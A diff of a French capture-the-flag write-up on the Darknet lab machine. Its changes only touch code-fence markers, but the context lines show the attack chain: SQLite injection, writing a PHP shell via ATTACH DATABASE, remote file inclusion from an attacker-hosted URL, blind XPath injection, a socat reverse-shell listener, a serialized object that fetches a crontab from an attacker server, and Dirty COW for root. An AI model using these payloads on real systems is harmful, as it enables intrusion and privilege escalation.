@@ -14,7 +14,7 @@ Conséquence directe de tout ça, les scripts présents dans cet article sont en
 Une totale liberté de pensée cosmique...
 ----------------------------------------
 
-```plain
+```
 Nmap scan report for 888.darknet.com (192.168.1.69)
 Host is up (0.0027s latency).
 Not shown: 65532 closed ports
@@ -45,7 +45,7 @@ On se rend alors sur la page d'index quasi vide, logo un peu travaillé quand m�
 
 Quitte à avoir l'impression de répéter les même étapes à chaque CTF on lance un petit buster qui s'avère payant :  
 
-```plain
+```
 [+] Lancement du module buster
 + Testing directory http://192.168.1.69/
 Found webpage http://192.168.1.69/index
@@ -56,7 +56,7 @@ Found webpage http://192.168.1.69/sec.php
 
 Le listing est activé sur /access et on y trouve un fichier *888.darknet.com.backup* qui est une copie de la configuration Apache :  
 
-```plain
+```
 <VirtualHost *:80>
     ServerName 888.darknet.com
     ServerAdmin devnull@darknet.com
@@ -83,7 +83,7 @@ Et sur la saisie d'une apostrophe suivi de double-quote c'est encore plus verbeu
 
 Si l'on tente de fermer la requête qui semble être de la forme *select \*\*\* from \*\*\* where usurario = <user> and pass = hash(<pass>)* avec *' OR 1 #* on obtient l'erreur suivante :  
 
-```plain
+```
 unrecognized token: "#"
 ```
 
@@ -93,7 +93,7 @@ Pour une machine Linux il n'y a pas énormément de possibilités comme DB suppo
 
 [La documentation](https://www.sqlite.org/lang_comment.html) stipule que l'on peut utiliser des commentaires multi-ligne dans le style du langage C sans avoir à fermer le tag, ce qui s'avère payant avec le payload suivant :  
 
-```plain
+```
 admin' or 1 limit 1 /*
 ```
 
@@ -101,7 +101,7 @@ Cela nous amène à un textarea avec la mention *Administrador SQL*. On peut fai
 
 La configuration Apache vu plus tôt est donc d'une aide capitale pour créer une nouvelle base SQLite3 qui sera aussi un script PHP à nous :  
 
-```plain
+```
 ATTACH DATABASE '/home/devnull/public_html/img/shell.php' as pwn;
 CREATE TABLE pwn.shell (code TEXT);
 INSERT INTO pwn.shell (code) VALUES ("<?php phpinfo(); ?>");
@@ -116,7 +116,7 @@ La version du kernel date un peu (*Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+
 
 On trouve d'autres informations d'importance dans */etc/php5/cgi/php.ini* (on ne peut pas avoir de shell en raison des fonctions désactivées mais on peut au moins faire un *readfile()* :  
 
-```plain
+```
 allow_url_fopen allow_url_include On
 user_ini.filename .user.ini
 open_basedir /etc/apache2:/home/devnull:/tmp
@@ -139,13 +139,13 @@ Et on le sert avec un serveur web qui ne l'interprète pas (*python3 -m http.ser
 
 J'utilise enfin le script d'inclusion pour l'interpréter sur le serveur :  
 
-```plain
+```
 http://888.darknet.com/img/inc.php?p=http://192.168.1.3:8000/
 ```
 
 De cette façon on découvre un autre hôte virtuel :  
 
-```plain
+```
 Array
 (
     [0] => .
@@ -158,7 +158,7 @@ Array
 
 Voici les fichiers de configuration correspondants à *000-default* et *signal8* :  
 
-```plain
+```
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
 
@@ -192,7 +192,7 @@ Voici les fichiers de configuration correspondants à *000-default* et *signal8*
 </VirtualHost>
 ```
 
-```plain
+```
 <VirtualHost *:80>
     ServerName signal8.darknet.com
     ServerAdmin errorlevel@darknet.com
@@ -208,7 +208,7 @@ Madintaïwan
 
 Ce nouveau site contient une page permettant d'afficher des contacts (via un numéro d'ID passé en paramètre) et une section demandant des identifiants sous */xpanel* :  
 
-```plain
+```
 + http://signal8.darknet.com/contact.php (CODE:200|SIZE:251)
 + http://signal8.darknet.com/index.php (CODE:200|SIZE:277)
 + http://signal8.darknet.com/xpanel/edit.php (CODE:200|SIZE:298)
@@ -222,7 +222,7 @@ Le script est vulnérable à une forme d'injection SQL mais là encore il ne s'a
 
 On remarque que l'on peut notamment influer sur le résultat avec des conditions supplémentaires. Par exemple les conditions suivantes permettent de conserver l'output :  
 
-```plain
+```
 and (1=1)
 and ('1'='1')
 and (1<2)
@@ -261,7 +261,7 @@ Il existe [différents](http://securityidiots.com/Web-Pentest/XPATH-Injection/Ba
 
 Armé de notre injection de condition on peut avoir extraire différentes informations dans ce style :  
 
-```plain
+```
 and substring(username,1,1)='e'
 and string-length(username)=10
 and string-length(clave)=11
@@ -291,7 +291,7 @@ print password
 
 On obtient les identifiants pour le *xpanel* :  
 
-```plain
+```
 devnull j4tC1P9aqmY
 errorlevel tc65Igkq6DF
 ```
@@ -368,7 +368,7 @@ for l in combinations(numbers, 4):
 
 Au bout d'un moment ça mort à l'hameçon :  
 
-```plain
+```
 Found key ('37', '10', '59', '17')
 Formato invalido!
 ```
@@ -505,7 +505,7 @@ socat file:`tty`,echo=0,raw tcp4-listen:9999
 
 Il faut bien sûr réinjecter ce fichier dans le script d'upload vu plus tôt et finalement lors du chargement du htaccess :  
 
-```plain
+```
 errorlevel@Darknet:/home/errorlevel/public_html/xpanel/uploads$ id
 id
 uid=1002(errorlevel) gid=1002(errorlevel) groups=1002(errorlevel)
@@ -513,13 +513,13 @@ uid=1002(errorlevel) gid=1002(errorlevel) groups=1002(errorlevel)
 
 Quand on recherche les fichiers appartenant à root mais word-writable on trouve celui-ci :  
 
-```plain
+```
 -rwxrwxrwx 1 root root 869 Apr 26  2015 /etc/suphp/suphp.conf
 ```
 
 Il dispose des entrées suivantes :  
 
-```plain
+```
 ; Minimum UID
 min_uid=100
 
@@ -592,7 +592,7 @@ class Test {
 
 L'exploitation semble on ne peut plus facile : on écrit un script qui instancie un objet Test, écrit les différentes valeurs pour lire une URL sous contrôle et recopier son contenu dans /etc/crontab puis on appelle *serialize()* avant d'envoyer le résultat vers *sec.php* :  
 
-```plain
+```
 O:4:"Test":3:{s:3:"url";s:33:"http://192.168.2.240:8000/crontab";s:9:"name_file";s:7:"crontab";s:4:"path";s:4:"/etc";}
 ```
 
@@ -600,7 +600,7 @@ Sauf que ça ne marche pas... WTF ! Evidemment ça fonctionne sur des tests loca
 
 Finalement j'ai utilisé [l'exploit de FireFart](https://github.com/FireFart/dirtycow/blob/master/dirty.c) pour [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) qui édite le fichier */etc/passwd* pour remplacer root par un utilisateur *firefart* avec un mot de passe de notre choix :  
 
-```plain
+```
 firefart@Darknet:~# id
 uid=0(firefart) gid=0(root) grupos=0(root)
 firefart@Darknet:~# ls
